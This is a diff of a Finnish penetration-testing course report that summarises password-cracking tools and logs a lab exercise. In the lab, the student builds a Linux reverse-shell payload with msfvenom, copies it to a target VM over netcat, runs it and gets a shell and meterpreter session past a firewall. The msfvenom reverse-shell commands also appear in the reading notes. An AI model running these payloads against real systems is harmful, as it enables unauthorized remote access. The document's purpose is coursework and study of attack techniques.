@@ -1,3 +1,38 @@
+# x) Lue/kuuntele ja tiivistä
+
+## Cracking Passwords with Hashcat (https://terokarvinen.com/2022/cracking-passwords-with-hashcat/)
+
+- Hashcatilla ja Hashid avulla voi tunnistaa ja murtaa tiivisteitä
+- Käytetty hyökkäys käyttää sanakirjaa ja vertaa niiden tiivisteitä saadun salasanan tiivisteisiin
+- Jotta Hashcat voi toimia tulee sen tietää minkä tyyppinen tiiviste on.
+
+## Crack File Password With John (https://terokarvinen.com/2023/crack-file-password-with-john/)
+
+- Jotta ohjelma voidaan asentaa tulee siitä ensin luoda koneen ympäristön tunnistava makefile
+- John The Ripper saa erotettua eri tiedostomuodoista salasanatiivisteitä
+- Se kykenee myös murtamaan ne
+
+## Lesson 6: Hacking User Credentials
+
+- Salasanojen murtaminen hyvin yleistä ja niihin on tehokkaita työkaluja
+- Salasanat tallennetaan tiivisteinä eri tietokantoihin
+- Salasanat tulee suojata sekä siirrossa, että säilössä
+- MITM hyökkäyksissä voidaan saada tietoa siirrossa
+- Hash funktiot on suunniteltu nopeiksi yksisuuntaisiksi funkitoksi
+- John The Ripper yksi yleisimmistä tiivisteiden murtajista
+- Osaa muokata yksinkertaisia kirjain ja numeromuunnoksia sanalistasta
+- John The Ripper pystyy murtamaan salasanoja osisssa ja useita salasanoja kerralla.
+- Murron voi lopettaa kesken ja jatkaa myöhemmin
+- Myös Hashcat on hyvin tehokas
+- Vahvat salasanat kaikkialla ja kaksivaiheinen tunnistus
+
+## Polop et al 2024: HackTricks (https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom)
+
+- Sisältää suuren listan yleisistä ja yksinkertaisista payloadeista
+- Pitää määrittää kohde, hyökkäyksen tyyppi ja mahdollinen encryptaus
+- msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf (yksinkertainen Linux reverse shell)
+- msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe (Yksinkertainen Windows reverse shell)
+
 # a) Hashcat
 
 Seurasin tehtävässä T. Karvisen ohjetta (https://terokarvinen.com/2022/cracking-passwords-with-hashcat/)
@@ -113,6 +148,8 @@ Tutkin sen sisällön 'cat' komennolla ja totesin tehtävän onnistuneen.
 # c) Fuffme
 
 ## Maalin asentaminen
+
+Käytän asentamisessa apuna Teron ohjetta (https://terokarvinen.com/2023/fuffme-web-fuzzing-target-debian/)
 
 Asensin ensin kaikki paketit ja kloonasin repositorion.
 
@@ -277,104 +314,89 @@ Selvitin ensin mikä msfvenom on. Löysin artikkelin aiheesta (https://www.offse
 MsfVenom on payload ja encoder generaattori (anteeksi kamala kieli)
 Sillä voi yhdellä komennolla luoda payloadeja haluttuun kohteeseen ja muokata niitä haluamansa mukaisesti. Tämä mahdollistaa erittäin nopean payloadin luomisen todella laajoilla valmiilla kohdeympäristöillä. MsfVenomin sisään pystyy vielä kirjoittamaan lisää koodia. Se ei kuitenkaan itsessään toimi exploittina vaan se pitää saada jollain muulla tavalla ajettua kohdekoneessa.
 
-Käytin pohjana Teron vinkkinä ollutta komentoa ja muokkasin sen vastamaan omaa ympäristöäni.
+Käytin pohjana MSFVenom cheatsheatilta löytynyttä komentoa ja muokkasin sen vastamaan omaa ympäristöäni.
 
+'msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.104 LPORT=4444 -f elf > shell.elf'
 Katsoin vielä mitä eri liput komennossa tekevät:
 
 - 'p' Valitsee payloadin, tässä tapauksessa 64 bittiselle Linuxille sopiva meterpreter, joka käyttää reverse_tcp hyökkäystä
-- '-o' Määrittää uloskirjoitettavan tiedoston.
+- '-f' Määrittää uloskirjoitettavan tiedoston muodon.
 - Muut määrittävät lähetyskoneen tiedot (Kali)
 
 Muut payloadit voi nähdä komennolla 'msfvenom -l payloads'
 
 ![kuva](https://github.com/user-attachments/assets/fc8f82d7-a5e8-41f7-85db-3d1faaa16b80)
 
-Yllä kuvaus valitusta hyötykuormasta. Ajoin komennon ja katsoin 'cat' komennolla mitä olin luonut.
-
-![kuva](https://github.com/user-attachments/assets/b6ab6ff4-0280-4640-9fa3-addddaf6a98c)
-
-Näin binääriä.
+Yllä kuvaus valitusta hyötykuormasta.
 
 Seuraavaksi minun piti keksiä, miten saan tämän hyökkäyksen vietyä eteenpäin. Totesin, että oletettavasti helpoin on Metasploit consolen kautta siten, että valitsen payloadin exploitin yhteydessä.
 
 Katsoin missä muut saman tyyppiset payloadit ovat kansio rakenteessa ja yrtitin viedä tiedostoa niiden joukkoon. Todellisuudessa tämä payload sieltä varmasti jo löytyy, mutta itse tehtynä tulee parempaa. En ollut varma toimiiko tämä näin, mutta päätin yrittää. Siirsin luodun tiedoston komennolla 'sudo cp infected /usr/share/metasploit-framework/modules/payloads/singles/linux/x64/infected'.
-Käsittääkseni multi/handler ei itsessään tee mitään hyökkäystä vaan kuuntelee ja ottaa vain hyökkäyksen hallinnan. Tämä tarkoitti, että minun pitäisi saada siirrettyä tiedosto jotenkin kohde koneelle.
+Käsittääkseni luettuani lisää multi/handler ei itsessään tee mitään hyökkäystä vaan kuuntelee ja ottaa vain hyökkäyksen hallinnan. Tämä tarkoitti, että minun pitäisi saada siirrettyä tiedosto jotenkin kohde koneelle.
+Yritin siirtää tätä netcatin avulla. Löysin foorumeilta ohjeen (https://superuser.com/questions/98089/sending-file-via-netcat)
+Avasin tiedoston hyökkäyskoneelta komennolla 'cat shell.elf | nc -l -p 4444' kohdekoneella otin sen vastaan komennolla 'nc 192.168.56.104 4444 > shell.elf'
+Tarkastin vielä tiedon siirtymisen oikein laskemalla molemmista päistä tiedostosta md5 tiivisteen ja ne tästmäsivät.
 
+![kuva](https://github.com/user-attachments/assets/6e1e0d16-3ab8-454a-ae55-3edc9cb0124d)
 
+*Hyökättävä*
 
+![kuva](https://github.com/user-attachments/assets/2dfc5ea1-e29c-4b74-89c8-c92facab2b60)
 
+*Hyökkääjä*
 
+Seuraavaksi avasin msfconsolen ja säädin multi/handler exploitin kuntoon.
 
+![kuva](https://github.com/user-attachments/assets/3a3b07fd-ab51-4a3d-a6eb-a39ac2157729)
 
+Seuraavaksi piti ajaa haitta kohdekoneella. Muutin tiedoston oikeudet villeiksi seiskoiksi ja ajoin ohjelman komennolla ./shell.elf
 
+![kuva](https://github.com/user-attachments/assets/7db1cd8e-22be-4992-bd70-4e82b8423c6a)
 
 
+Toisella koneella näin, että shell oli auennut ja pystyin ajamaan komentoja.
 
+![kuva](https://github.com/user-attachments/assets/0d89ac0b-ed70-4736-a38e-83570c535379)
 
+Pienten palomuurin asetusten säädön jälkeen sain myös meterpreterin toimintaan.
 
+![kuva](https://github.com/user-attachments/assets/b91a7e2b-34ad-4a87-ae51-e47bad3f0c66)
 
+Komennot toimivat.
 
+![kuva](https://github.com/user-attachments/assets/d3c9c65c-d552-4162-a004-5fe69333c8fe)
 
+Totesin, että olin saanut etäyhteyden auki vaikkakin se vaati toisen koneen apua. Tämä on kuitenkin erittäin tehokas tapa saada toinen kone keskustelemaan. Kohdekoneella oli myös palomuuri aktiivisena, jonka tämä hyökkäys ohitti.
+Toki ongelmana on jos toinen sammuttaisi juoksevan sovelluksen katkeasi myös etäyhteys.
 
+Totesin saaneeni riittävät oikeudet ja tehtävän onnistuneeksi.
 
+# Lähteet
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
- 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+1. T. Karvinen, 2024, Tunkeutumistestaus, https://terokarvinen.com/tunkeutumistestaus/, Luettu 17.11.2024
+   
+2. T. Karvinen, 2022, Cracking Passwords With Hashcat, https://terokarvinen.com/2022/cracking-passwords-with-hashcat/, Luettu 17.11.2024
+   
+3. T. Karvinen, 2023, Crack File Password With John, https://terokarvinen.com/2023/crack-file-password-with-john/, Luettu 17.11.2024
+   
+4. Polop et al, 2024, MSFVenom - CheatSheet, https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom, Luettu 17.11.2024
+   
+5. StackOverflow, 2022, gzip: stdin: not in gzip format tar: Child returned status 1 tar: Error is not recoverable: exiting now, https://stackoverflow.com/questions/39643013/gzip-stdin-not-in-gzip-format-tar-child-returned-status-1-tar-error-is-not-r, Luettu 17.11.2024
+    
+6. StackOverflow, 2013, Using make with -j4 or -j8, https://stackoverflow.com/questions/15289250/using-make-with-j4-or-j8, Luettu 17.11.2024
+    
+7. T. Karvinen, 2023, Fuffme - Install Web Fuzzing Target on Debian, https://terokarvinen.com/2023/fuffme-web-fuzzing-target-debian/, Luettu 17.11.2024
+    
+8. 'docker --help' Luettu 17.11.2024
+    
+9. B. Gökmen, 2024, Setting a Password on a PDF File in Linux, https://www.baeldung.com/linux/file-pdf-set-password, Luettu 17.11.2024
+    
+10. OffSec Services Limited, MSFvenom, https://www.offsec.com/metasploit-unleashed/msfvenom/, Luettu 17.11.2024
+    
+11. SuperUser, 2010, Sending file via netcat, https://superuser.com/questions/98089/sending-file-via-netcat, Luettu 17.11.2024
+    
+12. 'man unzip' Luettu 17.11.2024
+    
+13. Santos et al 2017: Security Penetration Testing - The Art of Hacking Series LiveLessons: Lesson 6: Hacking User Credentials
 
 
